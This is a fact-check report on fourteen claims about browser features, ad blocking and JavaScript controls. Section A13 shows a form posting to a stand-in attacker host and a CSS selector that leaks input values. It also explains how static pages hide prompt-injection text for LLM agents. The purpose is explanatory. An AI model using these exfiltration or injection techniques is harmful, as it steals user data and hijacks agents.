# Fact-check: Group A (A1 to A14)

Checked 14 October 2026 against primary sources where they were reachable (release notes, GitHub changelogs and source, vendor blogs, standards and status pages). Where only secondary coverage was available, that is stated.

| # | Verdict | One-line correction |
|---|---|---|
| A1 | Partly correct | Firefox 153 (21 Jul 2026) added built-in Containers, described as a preview. The "Mozilla quotes" are a CyberInsider paraphrase, not Mozilla's wording |
| A2 | Partly correct | Disabled in 1.81.131 (6 Aug 2025). Code removed in 1.82.161 (4 Sep 2025). Off by default for new installs since 1.78 |
| A3 | Partly correct | PeerTube uses its own fork of P2P Media Loader for HLS P2P. WebTorrent has also supported Edge since its WebRTC support landed |
| A4 | Wrong (Firefox) | Firefox is 141 (Windows, Jul 2025) and 145 (Apple Silicon, macOS 26+), not 125. Not shipped on Firefox Linux or Android, Chrome Linux is partial, Chrome Windows ARM64 is behind a flag |
| A5 | Correct | Matches the Chrome 144 and 145 "What's New in WebGPU" posts. mapSync is a flag-gated prototype |
| A6 | Partly correct | The ORT Web WebNN EP exists, but WebNN is not usable on the open web: it needs a flag, and the Chrome origin trial was delayed and then disabled (Mar 2026) |
| A7 | Mostly correct | It was a preview in Early Bird settings. The colour sync runs the other way (lights follow the GX theme). "Reference implementation" is not Opera's term |
| A8 | Correct | Ollama integration (HA 2024.4), REST and WebSocket APIs |
| A9 | Partly correct / wrong in parts | Removal from the store on 31 Aug 2026 is right. uBOL's default mode (Optimal) does include specific cosmetic filtering and scriptlets. Only generic cosmetic filtering needs Complete. Edge's MV2 phase-out was announced Aug 2026 and is still in progress |
| A10 | Partly correct / misleading | The adblock-rust crate landed in Fx 149 off by default as an experiment (bug 2013888). It is not an ad blocker you can use. Opera (14 May 2026) is correct. Waterfox does use adblock-rust |
| A11 | Correct | Chromium blog, 14 May 2020 (Chrome 85 heavy ad intervention) |
| A12 | Wrong / misleading | Chrome and Edge have a per-site JS block in Page info > Site settings. Brave Shields has a per-site "Block scripts". Safari has a global setting. Only Firefox lacks a UI for this. The extensions named are not popular (NoJSLite has about 1 user) |
| A13 | Partly wrong | Mining and canvas fingerprinting do need JS. CSS-only fingerprinting and attribute exfiltration, HTML form posts, pixels and prompt injection all work without JS |
| A14 | Wrong | ETP has a per-site on/off toggle in the shield/Trust panel, which creates an exceptions list |

---

## A1. Firefox 153 native Containers (July 2026), Mozilla quotes
- **Verdict: partly correct.**
- **Correct:** Firefox 153.0 release notes list Containers as **New**. The page says "first offered to Release channel users on **July 21, 2026**" and describes keeping "cookies and ad tracking isolated inside each container". https://www.firefox.com/en-US/firefox/153.0/releasenotes/ (21 Jul 2026)
- **Caveats:**
  - A Mozilla staff post on Mozilla Connect ("Containers now available in Firefox 153") calls it a **preview**. Commenters note that the release notes do not say it is enabled by default. https://connect.mozilla.org/t5/discussions/containers-now-available-in-firefox-153/m-p/132316 (Jul 2026; seen via search, page returned 403)
  - The quoted wording ("a lightweight solution for separating identities within a single browser window" and Profiles' "complete data separation") is **not a verified Mozilla quote**. It appears unquoted and unattributed in CyberInsider's paraphrase ("Mozilla positions Containers as..."). https://cyberinsider.com/firefox-153-adds-built-in-containers-for-easy-account-isolation/ (Jul 2026). I could not find it on a Mozilla page. Present it as a paraphrase or drop the quotation marks.

## A2. Brave removed WebTorrent in 1.81 (August 2025)
- **Verdict: partly correct. The date is right, but the wording blurs two steps.**
- Brave's desktop changelog shows three steps:
  - 1.78.x: "Disabled WebTorrent by default for new installs" (#44303).
  - **1.81.131, published 6 Aug 2025:** "Disabled WebTorrent" (#46416).
  - **1.82.161, published 4 Sep 2025:** "Removed WebTorrent code now that WebTorrent has been deprecated" (#46430).
- Source: https://github.com/brave/brave-browser/blob/master/CHANGELOG_DESKTOP.md, with release timestamps from the GitHub Releases API.
- Corrected fact: "Brave disabled its built-in WebTorrent in 1.81 (August 2025) and removed the code in 1.82 (September 2025)."

## A3. P2P Media Loader / WebTorrent browser support
- **Verdict: partly correct.**
- **P2P Media Loader (Novage):** It is an open-source library that delivers HLS/DASH over WebRTC P2P, using WebTorrent trackers for signalling. https://novage.com.ua/p2p-media-loader/overview
- **PeerTube:** It uses its own fork, `@peertube/p2p-media-loader-hlsjs`, for HLS P2P. PeerTube **v6.0.0 (Nov 2023)** dropped WebTorrent-player P2P, and P2P now runs only over HLS. https://github.com/Chocobozzz/PeerTube/releases/tag/v6.0.0 and https://github.com/Chocobozzz/PeerTube/issues/5465
- **"Niche platforms":** This is vague and unverified. Novage's site lists commercial player integrations (Radiant, Vidstack, Clappr and others).
- **WebTorrent FAQ:** "Chrome, Firefox, and Opera for Desktop and Android, as well as Microsoft Edge and Safari have support... No browser plugin, extension, or installation is required." https://webtorrent.io/faq. The essay's browser list is incomplete, but nothing in it is wrong.

## A4. "WebGPU stable in all major browsers: Chrome 113+, Edge 113+, Firefox 125+, Safari 26+"
- **Verdict: wrong on Firefox, and it overstates platform coverage.**
- Source: gpuweb Implementation Status wiki, last edited 2 Oct 2026. https://github.com/gpuweb/gpuweb/wiki/Implementation-Status
  - **Chrome/Edge:** 113 on Windows (x86/x64), macOS and ChromeOS. Android 121 (Android 12+). **Linux only from 144** (Intel Gen12+) and 147 (NVIDIA on Wayland). Other Linux setups and Windows ARM64 are behind a flag.
  - **Firefox: 141 on Windows** (22 Jul 2025). **145 on Apple Silicon with macOS 26+.** The wiki's Mac cell also lists 147 but does not say which Macs it covers, and non-Apple-Silicon Macs are listed as Nightly-only. **Linux is Nightly only** and **Android is behind a flag** (both targeted for 2026).
  - **Safari: 26** on macOS, iOS/iPadOS and visionOS. This part is correct.
- Firefox 125 never shipped WebGPU. Also see web.dev "WebGPU is now supported in major browsers" (Nov 2025): https://web.dev/blog/webgpu-supported-major-browsers
- Corrected fact: "Chrome/Edge 113+ (Windows/macOS/ChromeOS; Android 121; Linux from 144, partial), Firefox 141+ on Windows and 145+ on Apple Silicon macOS 26+ (not yet Linux/Android), Safari 26+."

## A5. Chrome 144 writeBuffer/writeTexture up to 2x; Chrome 145 subgroup uniformity and sync mapping in workers
- **Verdict: correct.**
- **Chrome 144** ("What's New in WebGPU", 7 Jan 2026): "Faster writeBuffer and writeTexture", "up to 2X better than the previous version, depending on the size of the data being transferred." https://developer.chrome.com/blog/new-in-webgpu-144
- **Chrome 145** (28 Jan 2026): WGSL `subgroup_uniformity` extension, plus "Experimental synchronous buffer mapping in workers". `GPUBuffer.mapSync()` is a prototype behind `--enable-features=WebGPUMapSyncOnWorkers`, and it is not standardized. https://developer.chrome.com/blog/new-in-webgpu-145

## A6. ONNX Runtime Web WebGPU and WebNN EPs; WebNN NPU usable in browsers
- **Verdict: partly correct. The EPs exist, but "usable in browsers" overstates it.**
- **ORT Web docs:** The WebNN EP takes `deviceType` cpu, gpu or npu. It needs `onnxruntime-web/all`, and the docs say the API and EP are "in active development". WebNN needs the browser flag "Enables WebNN API" in Chrome/Edge. https://onnxruntime.ai/docs/tutorials/web/ep-webnn.html
- **Chrome origin trial:**
  - It was approved for M145 to M147 (19 Dec 2025).
  - It was delayed and moved to M146 to M148 (5 Feb 2026), and then delayed again (24 Feb 2026). https://groups.google.com/a/chromium.org/g/blink-dev/c/5CWKSChYo98
  - A later post, which I saw only through search, says the trial was disabled on 27 Mar 2026 ("we decided to disable the Origin Trial") with no new milestone. Android is excluded.
- **Other browsers:** WebNN is not shipped by default in any major browser. Firefox and Safari have no shipping implementation.
- Corrected fact: "WebNN (incl. NPU) is available only behind a flag in Chromium; an origin trial was planned for 2026 but was delayed and disabled."

## A7. Opera GX Smart Home (Sept 2025)
- **Verdict: mostly correct, with one example reversed.**
- **Launch:** Opera's press release of 11 Sep 2025 calls it "an open-source solution based on a new MQTT API and browser extensions" that connects to Home Assistant, Homebridge and Node-RED. Home Assistant auto-discovers the device. https://press.opera.com/?p=3688
- **Preview status:** It shipped as a preview, enabled under Early Bird settings (`opera://settings/early_bird`, "MQTT Support"). https://blogs.opera.com/news/?p=4642
- **Repository:** https://github.com/operasoftware/opera-smart-home (Apache-2.0, created 26 Jun 2025) is described as the "Official Opera smart home extension based on new MQTT extension API". It also includes an `example_extension`. Opera does not use the phrase "reference implementation", but the description is fair.
- **Examples:**
  - "Dim lights when a movie plays" is correct ("Getting your room ready for watching movies").
  - **The colour example is backwards.** Opera's example syncs "the colors of smart bulbs and smart led strips with the theme color of Opera GX". The room follows the browser, not the other way round.

## A8. Home Assistant local LLM via Ollama; REST and WebSocket APIs
- **Verdict: correct.**
- Ollama integration, introduced in Home Assistant 2024.4, can "control Home Assistant": https://www.home-assistant.io/integrations/ollama/
- REST API: https://developers.home-assistant.io/docs/api/rest/
- WebSocket API: https://developers.home-assistant.io/docs/api/websocket/

## A9. uBlock Origin disabled from Chrome 138, removed from Web Store Aug 2026; uBOL lacks cosmetic/scriptlet by default; Edge MV2 phase-out
- **Verdict: partly correct. The uBOL claim is wrong, and the Edge claim is overstated.**
- **Chrome:** Chrome 138 (mid-2025) disabled MV2 extensions on stable, and Chrome 139 removed the option to re-enable them. Google removed the remaining MV2 extensions, including uBO, from the Chrome Web Store on **31 Aug 2026**. CyberInsider, 1 Sep 2026: https://cyberinsider.com/google-removes-ublock-origin-from-chrome-web-store-in-final-manifest-v2-purge/ (also AlternativeTo, Sep 2026). This part is **correct**.
- **uBOL: wrong.**
  - uBOL's source sets `defaultFilteringModes = { ..., optimal: ['all-urls'] }`, so the **default mode is Optimal**. Its manifest requests `<all_urls>` host permission. https://github.com/gorhill/uBlock/blob/master/platform/mv3/extension/js/mode-manager.js
  - Optimal mode applies **specific cosmetic filtering and scriptlet injection**.
  - What is off by default is **generic** cosmetic filtering. The uBOL FAQ says: "by default there is no generic cosmetic filtering in uBOL... you will have to raise the blocking mode to Complete". https://github.com/uBlockOrigin/uBOL-home/wiki/Frequently-asked-questions-(FAQ)
  - Basic mode (network only) applies only if the user lowers the mode or does not grant host permissions.
- **Edge: overstated.** Microsoft announced on 7 Aug 2026 that consumer MV2 retirement would begin that month, rolling out Canary, then Dev/Beta, then Stable. The target is to finish by the end of 2026, with enterprise deprecation from early 2027 (policy `ExtensionManifestV2Availability`). As of Oct 2026 this is **in progress, not complete**. Coverage: PCWorld https://www.pcworld.com/article/3209789/microsoft-edge-is-about-to-lose-ublock-origin-too.html and WindowsReport. Check Microsoft Learn "Manifest V3 overview" for the primary wording.

## A10. Firefox 149 shipped adblock-rust silently; Opera One rebuilt blocker with uBlock list compat (May 2026); Waterfox same engine
- **Verdict: partly correct, and misleading as framed.**
- **Firefox:** Firefox 149 (24 Mar 2026) did land Brave's `adblock-rust` crate (Bugzilla **2013888**, "Add a prototype rich content blocking engine"). It is **disabled by default, has no UI and no filter lists**. It is enabled only through `privacy.trackingprotection.content.protection.enabled` plus a test list pref. The release notes do not mention it, which is correct. https://www.firefox.com/en-US/firefox/149.0/releasenotes/
  - Shivan Kaul (Brave), 20 Apr 2026: https://shivankaul.com/blog/firefox-bundles-adblock-rust
  - The Register (6 May 2026) says it is "not intended for blocking ads". "Shipped" should read "landed as an experimental, off-by-default engine".
- **Opera:** **Correct.** Opera blog of 14 May 2026, "Opera One gets a new and faster native ad blocker", describes a "completely rebuilt engine" and "compatibility with uBlock lists and filters". https://blogs.opera.com/news/2026/05/opera-one-gets-a-new-and-faster-native-ad-blocker/
- **Waterfox:** **Correct in substance.** Waterfox announced an adblock-rust-based built-in blocker in its 15-year anniversary post (around 1 Apr 2026): https://www.waterfox.com/blog/15-years-of-forking/ (CyberInsider, 1 Apr 2026). Kaul says it builds on Firefox's integration. The order of events is unclear: Waterfox's announcement predates the public discovery of the Firefox code.

## A11. 0.3% of ads / 27% of network data / 28% of CPU
- **Verdict: correct, with a wording nit.** The source says "27% of network data used by ads and 28% of all ad CPU usage".
- Chromium Blog, "Protecting users from resource-heavy ads" (14 May 2020). The thresholds are 4 MB network, 15 s CPU in any 30 s window, or 60 s total CPU, and the intervention shipped around Chrome 85 (Aug 2020). https://blog.chromium.org/2020/05/resource-heavy-ads-in-chrome.html
- These are Google's 2020 measurements and should be dated as such.

## A12. "No per-tab JS switch as a first-class control"; extension popularity
- **Verdict: wrong or misleading.**
- **Chrome and Edge:**
  - JavaScript is a **per-site** permission. Click the site-info icon left of the address bar, open Site settings, and set JavaScript to Block or Allow. A global default and an exceptions list are at `chrome://settings/content/javascript`. https://support.google.com/chrome/answer/114662
  - This is per-site (origin), not per-tab, but it is a first-class, non-developer user control.
  - DevTools also has a "Disable JavaScript" command that applies **per tab** while DevTools is open.
- **Firefox:**
  - The only built-in control is the **global** `javascript.enabled` pref in about:config. There is no per-site UI.
  - DevTools Settings has "Disable JavaScript" for the current tab while the toolbox is open.
  - Per-site control needs NoScript or similar.
- **Safari (macOS):** There is a **global** "Enable JavaScript" checkbox in Settings > Security. https://support.apple.com/guide/safari/ibrw1074/mac. Develop menu > Disable JavaScript is also available. There is no per-site JS setting. On iOS the toggle is under Settings > Apps > Safari > Advanced.
- **Brave:** Shields has a **per-site** "Block scripts" toggle in the address-bar Shields panel. Your choice is remembered per site and overrides the global Shields default.
- **Extensions:** "Among the most popular in every store" is false. AMO API figures (average daily users, Oct 2026):
  - **NoJSLite: 1**
  - "JavaScript Toggle": 54
  - "JavaScript Toggle On and Off": about 12.5k
  - "Disable JavaScript": about 31k
  - For comparison, uBlock Origin has about 11.3M.
  - Source: https://addons.mozilla.org/api/v5/addons/search/?q=nojslite
- Corrected framing: "Chromium browsers and Brave expose per-site JS blocking; Firefox and Safari offer only global switches; no browser offers a one-click per-tab JS toggle outside DevTools."

## A13. "A page with no JavaScript cannot mine, exfiltrate form data, fingerprint via canvas, or execute prompt injection"
- **Verdict: partly wrong. Two of the four statements hold, and two fail.**
- **Crypto-mining: true.** Browser mining needs JS, or WebAssembly, which can only be started from JS. With JS off, nothing can compute.
- **Canvas fingerprinting: true for canvas specifically.** Reading pixels needs `toDataURL` or `getImageData`.
  - **Script-less fingerprinting still exists.** CSS media, container and `@supports` queries, font probing via `local()` and `@font-face`, and calc arithmetic can all trigger conditional `url()` loads.
  - "Cascading Spy Sheets" (Trampert et al., CISPA, NDSS 2025) distinguished 97.95% of 1,176 browser/OS combinations with no JS, and fingerprinted 8 of 21 email clients. https://www.ndss-symposium.org/ndss-paper/cascading-spy-sheets/
- **Form data exfiltration: false.**
  - A plain HTML `<form action="https://attacker.example" method="post">` sends field values cross-origin on submit, with no JS. Autofill can fill hidden or off-screen fields that a user then submits unknowingly.
  - With CSS injection, attribute selectors such as `input[value^="a"]{background:url(//x/a)}` leak attribute values (for example CSRF tokens) character by character. `:has()` reaches hidden inputs.
    - OWASP WSTG "Testing for CSS Injection": https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection
    - PortSwigger "Blind CSS exfiltration": https://portswigger.net/research/blind-css-exfiltration
  - Limits: the `value` attribute rarely reflects live typing unless a framework syncs it, and CSP can block the beacons.
- **Tracking:** `<img>` pixels, link `ping`, CSS `url()`, server logs and cookies all work without JS.
- **Prompt injection: false.**
  - Prompt injection is **text (data) aimed at an LLM**, not code the browser runs.
  - A static page can carry instructions in visible text, `display:none` or off-screen elements, alt text, `aria-*` attributes, HTML comments, or tiny or same-colour text.
  - An agent that reads the DOM, accessibility tree, screenshot or fetched HTML ingests it whether or not JS runs. Static HTML is arguably the most reliable delivery channel.
  - Disabling JS removes only script-driven variants, such as content injected after load or clipboard tricks.

## A14. Firefox ETP "is a global setting, not a per-tab switch"
- **Verdict: wrong.**
- ETP has a global level (Standard, Strict or Custom), **plus a per-site toggle**: click the shield in the address bar and switch Enhanced Tracking Protection off "for this site". That adds the site to an exceptions list, managed under Settings > Privacy & Security > Manage Exceptions.
- Firefox 149 merged the shield and lock panels into the "TrustPanel", which keeps this control. https://www.firefox.com/en-US/firefox/149.0/releasenotes/
- Mozilla KB: https://support.mozilla.org/kb/enhanced-tracking-protection-firefox-desktop (Android and iOS articles describe the same per-site toggle and exceptions list).
- It is per-site, not per-tab. That distinction is the essay's only defensible point.
